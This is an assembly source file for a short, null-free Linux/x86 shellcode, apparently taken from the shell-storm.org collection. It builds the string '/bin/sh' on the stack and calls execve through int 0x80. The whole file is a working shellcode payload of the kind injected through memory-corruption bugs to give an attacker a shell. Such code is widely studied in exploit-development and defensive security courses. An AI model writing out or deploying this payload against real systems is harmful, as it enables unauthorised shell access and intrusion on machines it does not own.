;Linux/x86 execve /bin/sh shellcode
;23 bytes
;null-free

;http://www.shell-storm.org/shellcode/files/shellcode-827.php
;author: Hamza Megahed

global _start 
 
section .text 
_start:

	xor eax,eax
	push eax
	push dword 0x68732f2f
	push dword 0x6e69622f
	mov ebx,esp
	push eax
	push ebx
	mov ecx,esp
	mov al,0xb
	int 0x80
